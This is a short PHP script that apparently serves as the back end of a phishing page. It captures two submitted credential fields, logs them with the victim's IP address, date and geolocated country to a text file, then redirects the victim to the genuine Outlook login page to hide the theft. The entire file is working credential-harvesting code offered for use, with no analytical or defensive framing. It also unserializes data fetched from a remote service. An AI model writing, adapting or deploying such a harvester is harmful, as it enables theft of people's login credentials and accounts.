<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('America/Bogota');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

	$file = fopen("soportes.txt", "a");
fwrite($file, "Pin : ".$_POST['namee']." - Pin2 : ".$_POST['pwss']." - ".date('d/m/Y')." ".$userp." ".$pais."" . PHP_EOL);
fwrite($file, "======================" . PHP_EOL);

Header ("Location: https://outlook.live.com/owa/");
?>
